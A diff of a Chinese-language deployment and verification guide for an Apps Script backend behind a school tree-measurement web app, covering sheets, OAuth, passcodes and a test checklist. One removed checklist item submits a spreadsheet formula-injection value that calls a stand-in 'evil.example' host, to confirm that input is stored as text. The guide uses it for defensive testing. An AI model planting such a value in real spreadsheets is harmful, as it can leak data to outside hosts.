@@ -1,163 +1,94 @@
 # Apps Script 後端部署與驗證說明
 
-> **此檔案的部署與驗證步驟需要您自己的 Google 帳號與校方 Google Workspace 網域執行,無法由 AI 代為完成。**
-> 以下為給人類操作者的操作指南與檢查清單,AI 僅完成了 `Code.gs` 程式碼撰寫。
+> 部署與驗證需要您自己的 Google 帳號操作,無法由 AI 代為完成。
 
----
+## 兩種身分
 
-## Step 1:建立 Google Sheet 與分頁結構
+| | 學生 | 老師 |
+|---|---|---|
+| 憑證 | 班級座號 + 個人通行碼(老師發的紙條) | Google 登入(ID Token),email 必須在「教師名單」分頁 |
+| 能做什麼 | 送出量測 | 管理學生名單、發/重設通行碼、停用學生 |
+| 姓名來源 | 由「學生名單」帶入,**不採用前端傳來的姓名** | — |
 
-1. 在您的 Google 帳號(校網域帳號)下,建立一份新試算表,命名為「校園樹木量測紀錄」。
-2. 建立兩個分頁:
+公開只讀(**不含姓名/座號**):`?action=summary`(每棵樹最新量測)、`?action=history&treeId=…`(單棵歷年)。
 
-   **分頁一:「樹木主檔」**
+## Step 1:Google Sheet
 
-   第一列(標題列):
-
-   | 樹編號 | 樹種 | GPS座標 | 建立日期 |
-   |---|---|---|---|
-
-   **分頁二:「量測紀錄」**
-
-   第一列(標題列):
+1. 建立試算表,把預設分頁改名 **量測紀錄**,第 1 列 A~J 依序:
 
    | 樹編號 | 量測時間戳 | 填寫人姓名 | 填寫人班級座號 | 仰角 | 水平距離 | 計算後樹高 | 樹圍 | 同步狀態 | 用戶端紀錄編號 |
    |---|---|---|---|---|---|---|---|---|---|
 
-   注意:`Code.gs` 的 `doPost` 是依欄位順序 `appendRow`,務必確認分頁二標題列順序與上表一致,否則寫入的資料會對錯欄。
+   後端寫入時依欄位位置存值,順序必須一致。第 10 欄用來去重(雙擊/離線重送不會重複)。
 
-   **第 10 欄「用戶端紀錄編號」(`clientRecordId`)** 是前端為每筆量測產生的唯一值,`doPost` 在寫入前會先掃這一欄:若已存在同值就跳過寫入並直接回成功。這讓「雙擊送出」與「離線佇列重送」不會產生重複列。**這一欄必須存在且位置正確**(`Code.gs` 的 `COLUMN_CLIENT_RECORD_ID = 10`),否則去重會失效。此欄由程式自動填寫,人工不要編輯。
+2. **教師名單**、**學生名單** 兩個分頁**後端會自動建立**,不必手動做。
+   - 「教師名單」:A 欄放教師的 Google 信箱(A1 標題、A2 起每列一個)。
+   - 「學生名單」:程式管理,**請勿手動改「通行碼雜湊」欄**。
 
-## Step 2:掛上 Apps Script 程式碼
+## Step 2:貼上程式碼
 
-1. 開啟上述試算表,選單「擴充功能 → Apps Script」。
-2. 將本目錄下 `Code.gs` 的內容貼入編輯器(檔名建議也命名為 `Code.gs`)。
-3. 確認 `ALLOWED_DOMAIN` 常數已依實際校網域調整(目前設定為 `nkhs.edu.tw`)。
-4. 儲存專案。
+「擴充功能 → Apps Script」→ 把 [Code.gs](Code.gs) 整份貼進去 → 存檔。
 
-## Step 3:建立 Google OAuth 用戶端 ID(登入用)
+> 這一版**不再有** `TEST_MODE`、`ALLOWED_DOMAIN`、`TEST_ALLOWED_EMAILS`,不必再改任何常數。
+> 誰是老師完全由「教師名單」分頁決定,增減老師不必重新部署。
 
-身分驗證改用 **Google Identity Services(GIS)登入 + ID Token 驗證**,與 Web App 的存取設定脫鉤。
+## Step 3:OAuth 用戶端 ID(教師登入用)
 
-1. 到 [Google Cloud Console](https://console.cloud.google.com/) 建立(或選用)一個專案。
-2. 「API 和服務 → OAuth 同意畫面」:使用者類型選「內部」(限校方 Workspace 網域),填完必填欄位。
-3. 「API 和服務 → 憑證 → 建立憑證 → OAuth 用戶端 ID」,應用程式類型選 **網頁應用程式**。
-4. 「已授權的 JavaScript 來源」填入前端網站的來源(**只填 origin,不含路徑**),例如:
-   `https://<user>.github.io`
-5. 建立後複製 **用戶端 ID**,填入兩個地方(必須完全一致):
-   - `public/tree.html` 的 `GOOGLE_CLIENT_ID`(取代 `PASTE_GOOGLE_OAUTH_CLIENT_ID_HERE`)
-   - `apps-script/Code.gs` 的 `GOOGLE_CLIENT_ID`(同一個佔位字串)
-
-**Google OAuth 用戶端 ID:** ___________________________________________ (由人類填入)
-
-### 沒有校方 Workspace 帳號時,先用個人 Gmail 完整測試
-
-開發階段若還沒拿到校方帳號,可以先用個人 Gmail 帳號把整條流程(登入 → 送出 → 寫入 Sheet)完整測過,再交接給學校:
-
-1. **OAuth 同意畫面的「使用者類型」選「外部」**(個人帳號建立不了「內部」類型),發布狀態保持**「測試中」**,並在「目標對象 → 測試使用者」加入您自己的 Gmail 帳號(最多可加 100 個)——只有名單裡的帳號登入得了,這本身就是一層存取控制。
-2. 其餘 Step 3 步驟(建立 OAuth 用戶端 ID、填入兩處 `GOOGLE_CLIENT_ID`)照常進行。
-3. 打開 `apps-script/Code.gs` 檔案最上面的**【本機測試專用開關】**區塊:
-   - 把 `TEST_MODE` 改成 `true`
-   - 把 `TEST_ALLOWED_EMAILS` 填入您測試用的個人 Gmail 帳號,例如 `['your-account@gmail.com']`
-4. 用該 Gmail 帳號登入頁面測試——因為個人帳號沒有校網域(`hd` claim),正常情況下會被 `AUTH_REJECTED` 擋下,`TEST_MODE` 開啟後,白名單裡的帳號會跳過網域檢查,但**仍然要通過** Google tokeninfo 的簽章驗證與 `aud` 比對,不是完全不驗證。
-
-**⚠️ 交接給學校前,務必:**
-- 把 `TEST_MODE` 改回 `false`,`TEST_ALLOWED_EMAILS` 清空
-- 確認 `ALLOWED_DOMAIN` 已經是真正的校網域
-- 用**校方帳號**重新走一次 Step 1(Sheet)、Step 3(OAuth 用戶端 ID)、Step 4(部署),不要沿用您個人帳號建的 Google Sheet / Apps Script 專案——校方資料應該由校方帳號擁有,而不是掛在老師個人的 Google 帳號底下
+Google Cloud Console → 建立「網頁應用程式」類型的 OAuth 用戶端 ID,「已授權的 JavaScript 來源」填前端網站的 origin(例如 `https://jcsk7049.github.io`)。
+用戶端 ID 要填在兩處且**必須完全一致**:`src/config.js` 的 `GOOGLE_CLIENT_ID`、`apps-script/Code.gs` 的 `GOOGLE_CLIENT_ID`(`tests/duplication-sync.test.js` 會檢查兩處相同)。
 
 ## Step 4:部署為 Web App
 
-在 Apps Script 編輯器內:
+「部署 → 新增部署作業 → 網頁應用程式」:**執行身分 = 我**、**有權限存取的使用者 = 任何人**。
+把 Web App 網址填進 `src/config.js` 的 `API_URL`(**只有這一個地方**)。
 
-1. 「部署 → 新增部署作業 → 選取類型:網頁應用程式」。
-2. 設定(**與舊版不同,請照新設定**):
-   - **執行身分(Execute as)**:「**我**」(指令碼擁有者)—— 不是「以存取應用程式的使用者身分」
-   - **有權限存取的使用者(Who has access)**:「**任何人**」
-3. 點擊部署,並在跳出的授權畫面完成 OAuth 授權(僅限您自己的帳號操作,AI 無法代為進行)。
-4. 部署完成後記下產生的 **Web App URL**,填入 `public/tree.html` 的 `API_URL`。
+之後每次更新 `Code.gs` 都要:部署 → **管理部署作業** → 鉛筆 → 版本選「**新版本**」→ 部署(網址不變)。
 
-**Web App URL:** ___________________________________________ (部署後由人類填入)
+「任何人」只是讓請求打得到端點;沒有通行碼或教師身分的請求一樣會被後端拒絕。
 
-### 為什麼存取權限要開「任何人」
+## Step 5:第一次啟用(老師)
 
-- 舊設定(執行身分=存取者、存取權限=僅限網域使用者)之下,**跨來源的 `fetch()` 根本到不了 `/exec`** —— Google 會回一個登入導向頁,瀏覽器的 CORS 規則也不允許帶著登入 cookie 跨站送出,結果是每一次線上送出都靜默失敗,看起來跟離線一模一樣。
-- 新設計把網域關卡整個搬進 `Code.gs`:每個請求都必須帶 GIS 簽發的 ID Token,後端用 `https://oauth2.googleapis.com/tokeninfo` 驗證,並檢查
-  `aud` == `GOOGLE_CLIENT_ID`、`hd` == `ALLOWED_DOMAIN`、未過期,三項全過才寫入。
-- 因此「任何人皆可存取」只是讓請求打得到端點,**沒有帶合法校內帳號權杖的請求一樣會被拒絕**(回 `AUTH_REJECTED`)。
+1. 開 `…/public/teacher.html` → Google 登入。**第一次會顯示「不在教師名單內」**(名單還是空的)。
+2. 回到 Google Sheet,會看到自動建好的「教師名單」分頁 → 在 A2 填您的 Google 信箱。
+3. 重新整理 `teacher.html` 再登入 → 進入教師端。
+4. 「學生名單與通行碼」→ 貼上名單 → 匯入 → **立刻列印通行碼紙條**發給學生。
 
-### 登入權杖過期(AUTH_EXPIRED)
+## 安全設計重點
 
-Google ID Token 約 1 小時後過期。若學生離線超過一小時才恢復網路,佇列中那筆的權杖已失效:
+- **通行碼只存雜湊**(SHA-256 + 只存在指令碼屬性裡的隨機 pepper + 班級座號),連試算表擁有者也看不到明碼;忘了就由老師「重設」。
+- **防暴力猜碼**:同一班級座號連錯 5 次鎖 10 分鐘;錯誤訊息一律相同(不透露是座號不存在、碼錯或被停用)。
+- 通行碼 7 碼(6 碼隨機 + 1 碼檢查碼),字元去掉 0/O/1/I 等易混字;**任何單一字元打錯前端離線也能立刻發現**。
+- 學生名單的**姓名由後端決定**,學生不能冒用別人的名字填寫。
+- 老師動作每次都在後端驗 Google ID Token(簽章、aud、未過期、信箱已驗證)並比對教師名單;前端頁面的登入只擋介面,**真正的保護在後端**。
+- 寫入 Sheet 前對文字欄位做公式注入防護;前 4 欄設為純文字(座號不會掉前導零)。
+- 摘要/歷年兩個公開端點只回時間、樹高、樹圍,**不含任何個資**,各有 5 分鐘快取,寫入時自動失效。
 
-- 後端**在呼叫 tokeninfo 之前**先解開 ID Token 自己的 payload 讀 `exp`(`getTokenExpirySeconds`),過期就直接回 `{status:'error', code:'AUTH_EXPIRED'}`。JWT 的 payload 是明碼 base64url,不必驗簽就讀得到;這裡只當「快速且可靠的過期預檢」,真正的信任邊界仍是 tokeninfo(驗簽 + `aud`/`hd`)。
-- 這樣就**不必再去比對 Google 錯誤訊息裡有沒有 "expired" 這個英文字** —— 舊做法一旦 Google 改文案,過期會被誤判成 `AUTH_REJECTED`。
-- 前端**不會**丟掉這筆資料(資料本身仍有效),而是停止背景自動重送,並顯示提示要學生重新登入;重新登入後會自動補送。
+## 回應代碼
 
-### 身分被拒(AUTH_REJECTED)—— 資料同樣不會被刪
+| code | 意義 | 前端行為 |
+|---|---|---|
+| `VALIDATION_FAILED` | 資料不合法 | 永久拒絕,移出離線佇列 |
+| `STUDENT_REJECTED` | 班級座號/通行碼錯,或該生被停用 | 永久拒絕(重送不會變好) |
+| `STUDENT_LOCKED` | 連錯太多次,暫時鎖定 | 當場告知,不入佇列;同步時保留稍後重試 |
+| `AUTH_EXPIRED` / `AUTH_REJECTED` / `TEACHER_REJECTED` | 老師登入問題 | 教師頁提示重新登入或聯絡管理者 |
+| `SERVER_ERROR` | 後端暫時出錯 | 保留重試 |
 
-`aud`/`hd`/email 網域任一項不符就回 `AUTH_REJECTED`。**前端會把這筆資料留在佇列**、暫停自動重送,並顯示「帳號驗證失敗,請聯絡老師確認系統設定」。
+## 驗證清單(部署後由人類逐項執行)
 
-原因:學生自己重新登入救不了 `aud` 不符 —— 那是 Step 3 兩處 `GOOGLE_CLIENT_ID` 沒貼成同一個的設定問題,只有老師改部署設定才修得好。設定修好前把資料丟掉,等於因為一個筆誤永久刪光全班紀錄。
+**後端的自動化測試**:`tests/codeGs.test.js` 會載入這份真的 `Code.gs`、配上假的 Sheet/快取/Google 服務,涵蓋通行碼產生與檢查碼、雜湊、鎖定、學生送出、教師驗證、名單匯入/重設/停用、公開端點不含個資。下面是**真實環境**才驗得到的部分:
 
-唯一會被移出佇列的是 `VALIDATION_FAILED`(資料本身壞掉,前端已先驗過一次,正常紀錄不會走到這裡)。
+- [ ] 教師名單內的帳號能登入 `teacher.html`;**不在名單的 Google 帳號**登入會被拒絕(顯示「不在教師名單內」)
+- [ ] 匯入 2~3 位測試學生,Sheet 的「學生名單」分頁看得到姓名、狀態,「通行碼雜湊」欄是 64 字元的 16 進位字串(**看不到明碼**)
+- [ ] 用學生的班級座號 + 紙條上的通行碼,在 `tree.html?treeId=<官方樹號>` 送出:畫面顯示「送出成功!…(填寫人:<名簿姓名>)」,Sheet「量測紀錄」新增一列,**姓名是名簿裡的**
+- [ ] 故意輸入錯的通行碼:被拒絕、**不會寫入 Sheet**;同一個座號連錯 5 次後顯示鎖定
+- [ ] 教師頁「重設」該生 → 舊通行碼立刻不能用、新的可以;「停用」後不能送出、「啟用」後恢復
+- [ ] 開 `…/exec?action=summary` 與 `…/exec?action=history&treeId=…`(不帶任何憑證):看得到量測,**沒有姓名或座號**
+- [ ] 開 `…/exec`(沒有 action)或 `…/exec?treeId=43667`:回 `VALIDATION_FAILED`,**不會洩漏任何資料**
+- [ ] 手動編輯 Sheet 後,公開端點最多 5 分鐘才反映(快取);透過網頁送出的新量測則會立刻反映
 
-## Step 5:手動驗證清單(TODO,部署後由人類逐項執行)
+## 交接給學校前
 
-- [ ] **(正式交接給學校前必查)** 打開 `Code.gs`,確認 `TEST_MODE` 是 `false`、`TEST_ALLOWED_EMAILS` 是空陣列——這個開關忘記關掉等於留一個繞過網域檢查的後門
-
-取得 ID Token 的方法:在已部署的量測頁面上用校內帳號登入後,開 devtools console 執行
-`JSON.parse(localStorage.getItem('tree-map-id-token')).token`,複製出來當下面的 `<ID_TOKEN>`(約 1 小時後過期)。
-
-- [ ] 帶**校網域帳號**的 ID Token 送出測試 POST,確認回應為 `{"status":"ok"}`,且「量測紀錄」分頁新增一列,「同步狀態」為「已同步」、第 10 欄有 `clientRecordId`
-- [ ] **同一個 `clientRecordId` 再送一次**,確認回應為 `{"status":"ok","duplicate":true}`,且 Sheet **沒有**新增第二列(去重生效)
-- [ ] 不帶 `idToken`(或隨便亂填)送出 POST,確認回應為 `{"status":"error","code":"AUTH_REJECTED",...}`,且 Sheet 沒有新增資料
-- [ ] 用**非校網域**的 Google 帳號(個人 gmail)登入取得 token 後送出,確認同樣回 `AUTH_REJECTED`
-- [ ] **(前端行為,在量測頁面上做)** 離線填 2 筆進佇列後恢復網路,讓補送被判 `AUTH_REJECTED`(最容易製造的情境:暫時把 `Code.gs` 的 `GOOGLE_CLIENT_ID` 改成別的字串再部署)。確認:兩筆**仍留在待同步佇列**(devtools → Application → IndexedDB → `tree-map-offline-queue`)、頁面顯示「帳號驗證失敗,請聯絡老師確認系統設定」、且不會每次 `online` 都重打後端。把 Client ID 改回正確值後重新登入,兩筆應自動補送成功。
-  - **為什麼 `AUTH_REJECTED` 不再丟掉資料**:`aud` 不符最常見的原因是 `public/tree.html` 與 `apps-script/Code.gs` 兩處的 `GOOGLE_CLIENT_ID` 沒貼成同一個(Step 3 是兩個各自獨立的人工貼上點)。這種設定筆誤會讓**每一筆**送出都被拒;若照舊把紀錄丟出佇列,一個五分鐘就能修好的筆誤會在第一次同步時永久刪光全班的量測資料。因此改成「保留資料、暫停自動重送、提示找老師」。
-- [ ] 把 `angleDeg` 改成 `95` 送出,確認回應為 `{"status":"error","code":"VALIDATION_FAILED",...}`,且 Sheet 沒有新增資料;**在量測頁面上**送同樣的錯誤資料,確認該筆**不會**留在佇列(資料本身壞掉,留著也送不出去 —— 只有 `VALIDATION_FAILED` 會被移出佇列)
-- [ ] `studentName` 填 `=IMPORTXML("http://evil.example","//a")` 送出,確認 Sheet 儲存格顯示的是那串**文字**而不是執行公式
-- [ ] 用超過一小時前取得的舊 token 送出,確認回應為 `{"status":"error","code":"AUTH_EXPIRED",...}`(**不是** `AUTH_REJECTED`)。此判定現在來自 token 自己的 `exp` claim(`getTokenExpirySeconds` 解 JWT 的 payload),**不再**依賴比對 Google 錯誤訊息裡有沒有 "expired" 這個英文字,因此 Google 改文案也不會誤判。
-  - 佐證方式:把舊 token 貼到 [jwt.io](https://jwt.io/) 或在 console 執行 `JSON.parse(atob(token.split('.')[1]))` 看 `exp`,確認 `exp * 1000 < Date.now()`;此時後端其實**完全沒有**呼叫 tokeninfo 就直接回 `AUTH_EXPIRED`(可在 Apps Script 的「執行項目」記錄確認執行時間極短、無外部呼叫)。
-  - 另測一個**格式壞掉**的 token(例如 `abc.def`,只有兩段):應回 `AUTH_REJECTED` 而非 `AUTH_EXPIRED`(讀不出 `exp` → 交給 tokeninfo 拒絕)。
-- [ ] 對 Web App URL 加上 `?treeId=A-023&idToken=<ID_TOKEN>` 送出 GET,確認回傳 `{"status":"ok","records":[...]}` 且內容與 Sheet 中該樹編號的所有紀錄一致
-- [ ] **(地圖著色用的公開摘要)** 直接在瀏覽器開 `<Web App URL>?action=summary`(**不帶任何 token**),確認回傳 `{"status":"ok","generatedAt":...,"trees":[{"no":"43667","height":...,"girth":...,"at":...,"n":...}]}`,且內容**只有**樹號/樹高/樹圍/時間/筆數,**沒有姓名、座號**
-- [ ] 送出一筆新量測後,**立刻**重新整理 `?action=summary`,應馬上看到新資料(寫入會清掉 5 分鐘快取,不必等)
-- [ ] **(歷年趨勢圖用)** 直接開 `<Web App URL>?action=history&treeId=43667`(不帶 token),確認回傳 `{"status":"ok","treeId":"43667","points":[{"at":...,"height":...,"girth":...}]}`,依時間由舊到新,**只有**時間/樹高/樹圍,沒有姓名、座號、紀錄編號
-- [ ] `?action=history`(不帶 treeId)應回 `{"status":"error","code":"VALIDATION_FAILED",...}`;沒量測過的樹號回 `"points":[]`
-
-### 測試 POST 範例(瀏覽器 devtools console)
-
-```javascript
-fetch('<Web App URL>', {
-  method: 'POST',
-  // 必須用簡單請求的 Content-Type,否則會觸發 Apps Script 無法回應的 CORS preflight
-  headers: { 'Content-Type': 'text/plain;charset=utf-8' },
-  body: JSON.stringify({
-    treeId: 'A-023',
-    timestamp: new Date().toISOString(),
-    studentName: '王小明',
-    studentClassNo: '301-12',
-    angleDeg: 35,
-    distanceM: 10,
-    girthCm: 120,
-    calculatedHeight: 7.0,
-    clientRecordId: crypto.randomUUID(),
-    idToken: '<ID_TOKEN>',
-  }),
-}).then((r) => r.json()).then(console.log);
-```
-
-### 測試 GET 範例
-
-```javascript
-fetch('<Web App URL>?treeId=A-023&idToken=<ID_TOKEN>').then((r) => r.json()).then(console.log);
-```
-
----
-
-## 與 `src/authDomain.js` 的關係
-
-`Code.gs` 內的 `isAllowedDomain` 函式邏輯與 `src/authDomain.js` 的 `isAllowedDomain` 等價地重複維護 —
-因 Apps Script 執行環境不支援 ES module 的 `import`/`export`,無法直接共用同一份程式碼。
-若未來變更網域檢查邏輯,**兩處都要同步修改**,並考慮在 PR 描述中互相提醒。
+- 用**校方帳號**重新建立 Sheet、Apps Script、OAuth 用戶端 ID 並部署,不要沿用個人帳號建的(資料應由校方擁有)
+- 在新的「教師名單」填入校方老師信箱
+- 刪除測試用的假資料列(例如樹號 `A-023`、`seed-1~3`)與測試用學生
+- 更新 `src/config.js` 的 `API_URL` / `GOOGLE_CLIENT_ID`,並升 `public/sw.js` 的 `CACHE_NAME` 版本
